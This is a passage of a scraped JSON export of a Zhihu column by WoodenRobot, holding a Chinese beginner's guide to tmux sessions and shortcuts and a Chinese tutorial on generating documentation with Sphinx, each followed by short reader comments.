                    "content": "slenium是否更强大", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "金二哥", 
                    "userLink": "https://www.zhihu.com/people/be71e7c97d37130aef1ad7af88a494d4", 
                    "content": "赞赞赞", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "与pyppeteer相比如何", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/27915505", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 45, 
            "title": "Tmux入门指南", 
            "content": "<p>个人博客地址：<a href=\"https://link.zhihu.com/?target=http%3A//woodenrobot.me/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">woodenrobot.me</a></p><h2>前言</h2><p>很多时候我们需要通过SSH连接服务器进行一些操作，费了好长时间调好了程序，一顿饭的功夫SSH超时了(broken pipe)，重新连上去正在运行的程序也都没了，一切又得从头再来。这个时候你就非常需要用到tmux了，用tmux在服务器上创建一个会话（Session），在该会话中进行操作，你可以随时随地断开和重新连接会话（Session），即便是SSH中断了你在远程服务器上的工作状态也可以持久化地保存。</p><h2>简介</h2><blockquote>tmux 是一个优秀的终端复用器类自由软件，功能类似 GNU Screen，但使用 BSD 许可发布。用户可以通过 tmux 在一个终端内管理多个分离的会话，窗口及面板，对于同时使用多个命令行，或多个任务时非常方便。</blockquote><h2>功能特性：</h2><ul><li>一个虚拟终端可以管理多个会话，窗口和面板</li><li>支持分屏，同时处理多个操作</li><li>窗口、面板可以在会话间自由移动，切换</li><li>丰富灵活的状态行展示</li><li>支持自定义快捷键，依照个人习惯配置令操作更高效</li><li>不受断网影响，避免丢失重要工作进度</li><li>结对编程，方便演示与协作</li><li>自带复制粘贴缓冲区管理</li><li>脚本化配置，可配置多种操作环境</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><h2>层次结构</h2><p class=\"ztext-empty-paragraph\"><br/></p><figure><noscript><img src=\"https://pic4.zhimg.com/v2-ec4649187e1203b57854856afb7303cf_b.jpg\" data-rawwidth=\"1140\" data-rawheight=\"904\" class=\"origin_image zh-lightbox-thumb\" width=\"1140\" data-original=\"https://pic4.zhimg.com/v2-ec4649187e1203b57854856afb7303cf_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1140&#39; height=&#39;904&#39;&gt;&lt;/svg&gt;\" data-rawwidth=\"1140\" data-rawheight=\"904\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1140\" data-original=\"https://pic4.zhimg.com/v2-ec4649187e1203b57854856afb7303cf_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-ec4649187e1203b57854856afb7303cf_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>tmux的主要元素分为三层：</p><ul><li>Session 一组窗口的集合，通常用来概括同一个任务。session可以有自己的名字便于任务之间的切换。</li><li>Window 单个可见窗口。Windows有自己的编号，也可以认为和ITerm2中的Tab类似。</li><li>Pane 窗格，被划分成小块的窗口，类似于Vim中 C-w +v 后的效果。</li></ul><h2>安装tmux</h2><h2>Linux安装</h2><div class=\"highlight\"><pre><code class=\"language-text\">sudo apt-get install tmux</code></pre></div><h2>Mac OS安装</h2><div class=\"highlight\"><pre><code class=\"language-text\">brew install tmux</code></pre></div><h2>基本操作</h2><p>首先在tmux会话中使用的快捷键都需要一个前缀来激活，前缀默认为Ctrl+b（即：在按快捷键之前需要按一下前缀）。</p><h2>查询所有会话（Session）</h2><p>在命令行输入下列命令查询当前所有会话。</p><div class=\"highlight\"><pre><code class=\"language-text\">tmux ls</code></pre></div><p>你会发现no server running on /private/tmp/tmux-501/default，这是因为我们还没有创建会话（Session）。</p><h2>创建会话（Session)</h2><div class=\"highlight\"><pre><code class=\"language-text\">tmux new -s session-name</code></pre></div><p>通过上述命令新建一个有特定名称的会话。\n一般情况下我们不会使用下列命令创建不指定名字的会话。</p><div class=\"highlight\"><pre><code class=\"language-text\">tmux new</code></pre></div><h2>断开会话（Session）</h2><p>使用下列命令断开当前会话（断开会话并不影响会话中运行的程序，断开后还可以重新连接）</p><div class=\"highlight\"><pre><code class=\"language-text\">tmux detach</code></pre></div><p>或者使用tmux中的快捷键</p><div class=\"highlight\"><pre><code class=\"language-text\">Ctrl+b d(即先使用Ctrl+b快捷键前缀，然后再按d)</code></pre></div><h2>重新连接会话（Session）</h2><p>在命令行输入tmux a即可快速连接第一个所有会话中的第一个。</p><div class=\"highlight\"><pre><code class=\"language-text\">tmux a</code></pre></div><p>或者通过会话名连接该一个会话</p><div class=\"highlight\"><pre><code class=\"language-text\">tmux a -t session-name</code></pre></div><h2>关闭会话</h2><p>通过下列命令关闭会话后，会话中的程序也会全部关闭。</p><div class=\"highlight\"><pre><code class=\"language-text\">tmux kill-session -t session-name</code></pre></div><p>当然你也可以通过直接按Ctrl+d关闭会话、窗口或窗格。</p><h2>tmux中的快捷键参考</h2><p>注意以下快捷键适用于tmux会话中，使用前皆需要按下快捷键前缀Ctrl+b。</p><h2>帮助</h2><ul><li>？ 获取帮助信息</li></ul><h2>会话（Session）管理</h2><ul><li>s 列出所有会话</li><li>$ 重命名当前的会话</li><li>d 断开当前的会话</li></ul><h2>窗口（Window）管理</h2><ul><li>c 创建一个新窗口</li><li>, 重命名当前窗口</li><li>w 列出所有窗口</li><li>% 水平分割窗口</li><li>&#34; 竖直分割窗口</li><li>n 选择下一个窗口</li><li>p 选择上一个窗口</li><li>0~9 选择0~9对应的窗口</li></ul><h2>窗格（Pane）管理</h2><ul><li>% 创建一个水平窗格</li><li>&#34; 创建一个竖直窗格</li><li>q 显示窗格的编号</li><li>o 在窗格间切换</li><li>} 与下一个窗格交换位置</li><li>{ 与上一个窗格交换位置</li><li>! 在新窗口中显示当前窗格</li><li>x 关闭当前窗格</li></ul><h2>其他</h2><ul><li>t 在当前窗格显示时间</li></ul><h2>参考文章</h2><ol><li><a href=\"https://link.zhihu.com/?target=http%3A//blog.jobbole.com/87278/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Tmux 入门介绍</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//blog.jobbole.com/87562/%3Futm_source%3Dblog.jobbole.com%26utm_medium%3DrelatedPosts\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Tmux：Linux 从业者必备利器</a></li></ol>", 
            "topic": [
                {
                    "tag": "tmux", 
                    "tagLink": "https://api.zhihu.com/topics/20030783"
                }
            ], 
            "comments": [
                {
                    "userName": "我是小狗", 
                    "userLink": "https://www.zhihu.com/people/8626f6379fb862a56406403d2fa37c9f", 
                    "content": "学习了", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "<p>感谢</p>", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "<p>这篇更好：<a href=\"http://link.zhihu.com/?target=https%3A//www.jianshu.com/p/ec9c372e33f5\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">tmux 快速入门</a></p>", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/27544821", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 8, 
            "title": "用Sphinx快速制作文档", 
            "content": "<p>个人博客地址：<a href=\"https://link.zhihu.com/?target=http%3A//woodenrobot.me/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">woodenrobot.me</a></p><h2>简介</h2><p>Sphinx 是一种文档工具，它可以令人轻松的撰写出清晰且优美的文档, 由 Georg Brandl 在BSD 许可证下开发. <a href=\"https://link.zhihu.com/?target=https%3A//docs.python.org/3/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">新版的Python文档</a>就是由Sphinx生成的， 并且它已成为Python项目首选的文档工具,同时它对 C/C++ 项目也有很好的支持; 并计划对其它开发语言添加特殊支持. 本站当然也是使用 Sphinx 生成的，它采用reStructuredText! Sphinx还在继续开发. 下面列出了其良好特性,这些特性在Python官方文档中均有体现:</p><ul><li>丰富的输出格式: 支持 HTML (包括 Windows 帮助文档), LaTeX (可以打印PDF版本), manual pages（man 文档）, 纯文本</li><li>完备的交叉引用: 语义化的标签,并可以自动化链接函数,类,引文,术语及相似的片段信息</li><li>明晰的分层结构: 可以轻松的定义文档树,并自动化链接同级/父级/下级文章</li><li>美观的自动索引: 可自动生成美观的模块索引</li><li>精确的语法高亮: 基于 Pygments 自动生成语法高亮</li><li>开放的扩展: 支持代码块的自动测试,并包含Python模块的自述文档(API docs)等</li></ul><p>Sphinx 使用 reStructuredText 作为标记语言, 可以享有 Docutils 为reStructuredText提供的分析，转换等多种工具.</p><h2>安装Sphinx</h2><p>Sphinx为Python语言的一个第三方库。我们需要在终端中输入下列命令进行安装：</p><div class=\"highlight\"><pre><code class=\"language-text\">pip install sphinx</code></pre></div><h2>创建Sphinx项目</h2><p>创建一个用于存放文档的文件夹，然后在该文件夹路径下运行下列命令快速生成Sphinx项目：</p><div class=\"highlight\"><pre><code class=\"language-text\">sphinx-quickstart</code></pre></div><p>接下来会让你选择一些配置：</p><p>1. 设置文档的根路径（回车，使用默认设置）</p><div class=\"highlight\"><pre><code class=\"language-text\">Enter the root path for documentation.\n&gt; Root path for the documentation [.]:</code></pre></div><p>2. 是否分离source和build目录（输入y,选择分离，方便管理）</p><div class=\"highlight\"><pre><code class=\"language-text\">You have two options for placing the build directory for Sphinx output.\nEither, you use a directory &#34;_build&#34; within the root path, or you separate\n&#34;source&#34; and &#34;build&#34; directories within the root path.\n&gt; Separate source and build directories (y/n) [n]:</code></pre></div><p>3. 设定模板前缀（回车，使用默认选项）</p><div class=\"highlight\"><pre><code class=\"language-text\">Inside the root directory, two more directories will be created; &#34;_templates&#34;\nfor custom HTML templates and &#34;_static&#34; for custom stylesheets and other static\nfiles. You can enter another prefix (such as &#34;.&#34;) to replace the underscore.\n&gt; Name prefix for templates and static dir [_]:</code></pre></div><p>4. 输入项目名称和作者</p><div class=\"highlight\"><pre><code class=\"language-text\">The project name will occur in several places in the built documentation.\n&gt; Project name: Sphinx-test\n&gt; Author name(s): test</code></pre></div><p>5. 输入项目版本号</p><div class=\"highlight\"><pre><code class=\"language-text\">Sphinx has the notion of a &#34;version&#34; and a &#34;release&#34; for the\nsoftware. Each version can have multiple releases. For example, for\nPython the version is something like 2.5 or 3.0, while the release is\nsomething like 2.5.1 or 3.0a1.  If you don&#39;t need this dual structure,\njust set both to the same value.\n&gt; Project version []: 1.0.0\n&gt; Project release [1.0.0]:</code></pre></div><p>6. 文档语言（回车，默认即可）</p><div class=\"highlight\"><pre><code class=\"language-text\">If the documents are to be written in a language other than English,\nyou can select a language here by its language code. Sphinx will then\ntranslate text that it generates into that language.\n\nFor a list of supported codes, see\nhttp://sphinx-doc.org/config.html#confval-language.\n&gt; Project language [en]:</code></pre></div><p>7. 设定文档文就按的后缀</p><div class=\"highlight\"><pre><code class=\"language-text\">The file name suffix for source files. Commonly, this is either &#34;.txt&#34;\nor &#34;.rst&#34;.  Only files with this suffix are considered documents.\n&gt; Source file suffix [.rst]:</code></pre></div><p>8. 设定首页名称（回车，选择默认index即可）</p><div class=\"highlight\"><pre><code class=\"language-text\">One document is special in that it is considered the top node of the\n&#34;contents tree&#34;, that is, it is the root of the hierarchical structure\nof the documents. Normally, this is &#34;index&#34;, but if your &#34;index&#34;\ndocument is a custom template, you can also set this to another filename.\n&gt; Name of your master document (without suffix) [index]:</code></pre></div><p>9. 根据需要选择是否开启epub输出(一般用不到，回车默认不开启即可)</p><div class=\"highlight\"><pre><code class=\"language-text\">Sphinx can also add configuration for epub output:\n&gt; Do you want to use the epub builder (y/n) [n]:</code></pre></div><p>10. 根据需求选择是否开启相应的Sphinx拓展功能</p><div class=\"highlight\"><pre><code class=\"language-text\">Please indicate if you want to use one of the following Sphinx extensions:\n&gt; autodoc: automatically insert docstrings from modules (y/n) [n]: y\n&gt; doctest: automatically test code snippets in doctest blocks (y/n) [n]: y\n&gt; intersphinx: link between Sphinx documentation of different projects (y/n) [n]: y\n&gt; todo: write &#34;todo&#34; entries that can be shown or hidden on build (y/n) [n]: y\n&gt; coverage: checks for documentation coverage (y/n) [n]: y\n&gt; imgmath: include math, rendered as PNG or SVG images (y/n) [n]: y\n&gt; mathjax: include math, rendered in the browser by MathJax (y/n) [n]: y\nNote: imgmath and mathjax cannot be enabled at the same time.\nimgmath has been deselected.\n&gt; ifconfig: conditional inclusion of content based on config values (y/n) [n]: y\n&gt; viewcode: include links to the source code of documented Python objects (y/n) [n]: y\n&gt; githubpages: create .nojekyll file to publish the document on GitHub pages (y/n) [n]: n</code></pre></div><p>11. 创建项目</p><div class=\"highlight\"><pre><code class=\"language-text\">A Makefile and a Windows command file can be generated for you so that you\nonly have to run e.g. `make html&#39; instead of invoking sphinx-build\ndirectly.\n&gt; Create Makefile? (y/n) [y]: y\n&gt; Create Windows command file? (y/n) [y]: y\n\nCreating file ./conf.py.\nCreating file ./index.rst,.md.\nCreating file ./Makefile.\nCreating file ./make.bat.\n\nFinished: An initial directory structure has been created.\n\nYou should now populate your master file ./index.rst,.md and create other documentation\nsource files. Use the Makefile to build the docs, like so:\n   make builder\nwhere &#34;builder&#34; is one of the supported builders, e.g. html, latex or linkcheck.</code></pre></div><p>项目创建以后目录结构如下所示:</p><div class=\"highlight\"><pre><code class=\"language-text\">.\n├── Makefile\n├── build\n├── make.bat\n└── source\n    ├── _static\n    ├── _templates\n    ├── conf.py\n    └── index.rst</code></pre></div><ul><li>build:用来存放通过make html生成文档网页文件的目录</li><li>source：存放用于生成文档的源文件</li><li><a href=\"https://link.zhihu.com/?target=http%3A//conf.py/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">conf.py</a>: Sphinx的配置文件</li><li>index.rst: 主文档</li></ul><h2>定义文档结构</h2><p>主文档index.rst的主要功能是被转换成欢迎页, 它包含一个目录表（ “table of contents tree”或者 toctree ). Sphinx 主要功能是使用 reStructuredText, 把许多文件组织成一份结构合理的文档.</p><p>toctree指令初始值如下：</p><div class=\"highlight\"><pre><code class=\"language-text\">.. toctree::\n   :maxdepth: 2</code></pre></div><p>你可以在 content 的位置添加文档列表:</p><div class=\"highlight\"><pre><code class=\"language-text\">.. toctree::\n   :maxdepth: 2\n\n   tutorial.md\n   ...</code></pre></div><p>注：文档文件放在与index.rst同级目录下。</p><h2>支持markdown文件、更改文档主题</h2><p>Spinx本身不支持.md文件生成文档，需要我们使用第三方库recommonmark进行转换。 首先分别运行下列命令安装recommonmark与sphinx_rtd_theme库。</p><div class=\"highlight\"><pre><code class=\"language-text\">pip install recommonmark\n\npip install sphinx_rtd_theme</code></pre></div><p>安装好，在conf.py中修改下列两个配置：</p><div class=\"highlight\"><pre><code class=\"language-text\">source_suffix = [&#39;.rst&#39;, &#39;.md&#39;, &#39;.MD&#39;]\nhtml_theme = &#39;sphinx_rtd_theme&#39;</code></pre></div><p>并新增：</p><div class=\"highlight\"><pre><code class=\"language-text\">source_parsers = {\n    &#39;.md&#39;: CommonMarkParser,\n    &#39;.MD&#39;: CommonMarkParser,\n}</code></pre></div><h2>生成文档</h2><p>在Sphinx项目所在的文件夹路径下运行下列命令生成文档：</p><div class=\"highlight\"><pre><code class=\"language-text\">make html</code></pre></div><p>生成后的文档位于build/html文件夹内，用浏览器打开index.html即可看到生成后的文档。</p><h2>参考文章</h2><p>1. <a href=\"https://link.zhihu.com/?target=http%3A//zh-sphinx-doc.readthedocs.io/en/latest/index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Sphinx 使用手册</a><a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/opensource/os-sphinx-documentation\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">使用 </a></p><p>2. <a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/opensource/os-sphinx-documentation\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">sphinx 制作简洁而又美观的文档</a></p><p>3. <a href=\"https://link.zhihu.com/?target=https%3A//www.biaodianfu.com/sphinx-documentation.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">使用Sphinx制作说明文档</a></p>", 
            "topic": [
                {
                    "tag": "Sphinx（检索引擎）", 
                    "tagLink": "https://api.zhihu.com/topics/19569102"
                }, 
                {
                    "tag": "Python", 
                    "tagLink": "https://api.zhihu.com/topics/19552832"
                }, 
                {
                    "tag": "Python 文档", 
                    "tagLink": "https://api.zhihu.com/topics/19590689"
                }
            ], 
            "comments": [
                {
                    "userName": "一叶染秋", 
                    "userLink": "https://www.zhihu.com/people/59fee3ee27b7a751a61ff1e7d1f0f6aa", 
                    "content": "<p>sphinx比python自带的pydoc好了不少。sphinx_rtd_theme的主题的确是最好看的，也是大多新python轮子用的在线文档主题（比如：Scrapy）。更多可以参见：<a href=\"http://link.zhihu.com/?target=http%3A//www.sphinx-doc.org/en/stable/theming.html\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://www.</span><span class=\"visible\">sphinx-doc.org/en/stabl</span><span class=\"invisible\">e/theming.html</span><span class=\"ellipsis\"></span></a></p>", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }
    ], 
    "url": "https://zhuanlan.zhihu.com/c_73100933"
}
